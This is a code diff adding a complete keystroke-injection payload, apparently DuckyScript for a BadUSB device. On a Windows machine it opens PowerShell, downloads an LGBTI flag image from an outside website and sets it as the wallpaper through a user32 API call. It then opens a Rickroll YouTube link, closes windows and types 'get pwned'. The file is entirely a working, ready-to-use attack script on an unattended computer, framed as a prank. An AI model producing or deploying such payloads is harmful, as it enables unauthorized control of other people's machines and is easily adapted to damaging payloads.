@@ -1,0 +1,56 @@
+REM Open Powershell
+GUI r
+STRING powershell
+ENTER
+
+DELAY 2000
+
+REM Define image URL and destination path
+STRING $imageUrl = "https://www.ait.org.tw/wp-content/uploads/sites/68/2022/10/lgbti-flag-artwork-CMYK-print.jpg"
+ENTER
+STRING $localPath = "$env:TEMP\lgbti-flag-artwork-CMYK-print.jpg"
+ENTER
+
+REM Download the image
+STRING Invoke-WebRequest -Uri $imageUrl -OutFile $localPath
+ENTER
+
+REM Set the wallpaper
+STRING Add-Type @"
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+
+STRING public class Wallpaper {
+ENTER
+STRING  [DllImport("user32.dll", SetLastError = true)]
+ENTER
+STRING  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+ENTER
+STRING }
+ENTER
+STRING "@
+ENTER
+
+STRING $SPI_SETDESKWALLPAPER = 0x0014
+ENTER
+STRING $SPIF_UPDATEINIFILE = 0x01
+ENTER
+STRING $SPIF_SENDCHANGE = 0x02
+ENTER
+
+REM Apply wallpaper
+STRING [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $localPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
+ENTER
+
+DELAY 5000
+STRING clear
+ENTER
+
+STRING Start-Process "https://www.youtube.com/watch?v=xvFZjo5PgG0&list=RDxvFZjo5PgG0&start_radio=1&pp=ygUebmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXAgbm8gYWRzoAcB"
+ENTER
+DELAY 10000
+ALT TAB
+ALT F4
+GUI
+STRING get pwned
